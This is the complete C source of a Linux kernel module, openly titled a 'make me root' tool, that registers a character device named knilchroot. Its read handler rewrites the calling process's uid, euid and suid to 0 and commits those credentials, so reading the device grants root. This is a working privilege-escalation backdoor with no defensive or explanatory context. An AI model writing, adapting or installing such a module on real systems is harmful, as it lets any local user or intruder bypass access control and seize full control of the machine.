#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <asm/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("knilch");
MODULE_DESCRIPTION("a 'make me root' knilchroot");
MODULE_VERSION("0.0");


static ssize_t knilchroot_read(struct file *, char *, size_t, loff_t *);

static int major_num;

static struct file_operations file_ops = {
	.owner = THIS_MODULE,
	.read = knilchroot_read,
};

static ssize_t knilchroot_read(struct file *f, __user char *b, size_t l, loff_t *o) {
	struct cred * c = prepare_creds();
	printk(KERN_INFO "hello there.\n");
	if (!c) return -ENOMEM;
	c->uid = KUIDT_INIT(0);
	c->euid = KUIDT_INIT(0);
	c->suid = KUIDT_INIT(0);
	commit_creds(c);
	return 0;
}

static int __init knilchroot_init(void) {
	major_num = register_chrdev(0, "knilchroot", &file_ops);
	if (major_num < 0) {
		printk(KERN_ALERT "Could not register knilchroot: %d\n", major_num);
		return major_num;
	} else {
		printk(KERN_INFO "knilchroot loaded, major %d\n", major_num);
		return 0;
	}
}

static void __exit knilchroot_exit(void) {
	unregister_chrdev(major_num, "knilchroot");
	printk(KERN_INFO "knilchroot unloaded\n");
}

module_init(knilchroot_init);
module_exit(knilchroot_exit);

